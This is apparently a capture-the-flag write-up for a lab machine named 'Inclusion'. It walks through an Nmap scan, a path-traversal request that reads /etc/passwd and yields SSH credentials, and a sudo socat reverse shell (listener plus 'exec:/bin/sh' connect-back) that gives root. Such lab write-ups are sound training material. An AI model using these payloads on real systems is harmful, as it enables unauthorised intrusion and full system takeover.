# Inclusion

_13th September 2020_

## Host enumeration

The initial Nmap scan reports the following.

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
```

### Analysis

Since HTTP is running on port 80, we can proceed to view the web page on `http://<IP>/`. There just seems to be a basic webpage with some LFI/RFI definitions on it. These pages use data that are read from files on the file system.

## Local File Inclusion

We can try to check for LFI by changing the `name` parameter in the URL like so.

```
http://<IP>/article?name=/../../../../../../../etc/passwd
```

### Analysis

The webpage is prone to LFI since we can see the `etc/passwd` file. This file contains a commented piece of code with credentials. We can use these credentials for an SSH login. A file called `user.txt` is found in the current directory and contains the user flag.

## Privilege escalation

Upon looking at the permissions of the current user with `sudo -l`, we see that `usr/bin/socat` can be executed. From [GTFObins](https://gtfobins.github.io/gtfobins/socat/) we find the reverse shell payloads for `socat`. We execute `sudo socat file:`tty`,raw,echo=0 tcp-listen:12345` on the attacking machine and `socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane` on the inclusion machine.

### Analysis

A shell is obtained as the (root) user.

```
# whoami
root
```

We can now navigate to the `/root` directory and find the root flag inside a file called `root.txt`.
